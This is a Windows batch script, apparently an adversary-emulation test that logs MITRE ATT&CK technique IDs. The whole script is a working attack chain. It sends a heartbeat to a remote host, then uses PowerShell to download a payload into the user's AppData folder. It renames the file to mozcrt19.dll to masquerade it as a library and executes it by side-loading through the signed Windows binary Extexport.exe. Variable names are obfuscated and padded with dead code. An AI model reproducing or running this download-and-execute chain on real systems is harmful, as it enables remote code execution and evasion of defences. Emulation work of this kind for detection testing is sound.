@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET yktnwwf=%APPDATA%\8895\16e276a4
SET fpakbq=Macula-Stage0-8895
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8895-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=help.txt
SET fpldhe=8895

SET logfile=%APPDATA%\!yydue!\macula-simulations.log
SET ttp=T1218|SignedBinaryProxyExecution

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_start>> "!logfile!" 2>nul
SET /A rdelay=%RANDOM% %% 30 + 30
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_start=!rdelay!s>> "!logfile!" 2>nul
timeout /t !rdelay! /nobreak >nul
SET state=0
GOTO qwzxc

:dead1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dead_code>> "!logfile!" 2>nul
EXIT

:qwzxc
IF !state!==0 GOTO mhvbgy
IF !state!==17 GOTO dkqlpg
IF !state!==42 GOTO ptyuvw
IF !state!==99 GOTO END

:dead2
GOTO dead3

:mnbvf
SET rslt=1
SET err=
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_complete>> "!logfile!" 2>nul
SET ttpline=[!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-!ttp!=!rslt!:!err!
echo !ttpline!>> "!logfile!" 2>nul
SET state=17
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: sleep_start=15s>> "!logfile!" 2>nul
ping -n 15 127.0.0.1 >nul
GOTO qwzxc

:mhvbgy
GOTO mnbvf

:dead3
CHOICE /C Y /N /D Y /T 5 >nul
GOTO dead4

:dkqlpg
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_start>> "!logfile!" 2>nul
SET rslt=0
SET err=download_failed
powershell -Command "Invoke-WebRequest -Uri 'http://!repbmqg!/!omxgazu!' -OutFile '!yktnwwf!\!edjwtl!'" >nul 2>&1 && SET rslt=1 && SET err=
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_complete=!rslt!>> "!logfile!" 2>nul
SET ttpline=[!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1105|IngressToolTransfer=!rslt!:!err!
echo !ttpline!>> "!logfile!" 2>nul
SET state=42
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: sleep_start=10s>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul
GOTO qwzxc

:dead4
SET fake=unused

:ptyuvw
SET rslt=0
SET err=rename_failed
REN "!yktnwwf!\!edjwtl!" mozcrt19.dll 2>nul && SET rslt=1 && SET err=
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_complete=!rslt!>> "!logfile!" 2>nul
SET ttpline=[!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1036|Masquerading=!rslt!:!err!
echo !ttpline!>> "!logfile!" 2>nul
SET state=99
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start>> "!logfile!" 2>nul
cd /d "!yktnwwf!" >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execute_start>> "!logfile!" 2>nul
Extexport.exe . foo bar >nul 2>&1
IF !ERRORLEVEL!==0 (SET rslt=1) ELSE (SET rslt=0 && SET err=exitcode_!ERRORLEVEL!)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execute_complete=!rslt!>> "!logfile!" 2>nul
SET ttpline=[!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-!ttp!=!rslt!:!err!
echo !ttpline!>> "!logfile!" 2>nul
GOTO END

:dead5
timeout /t 5 /nobreak >nul

:END
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_end>> "!logfile!" 2>nul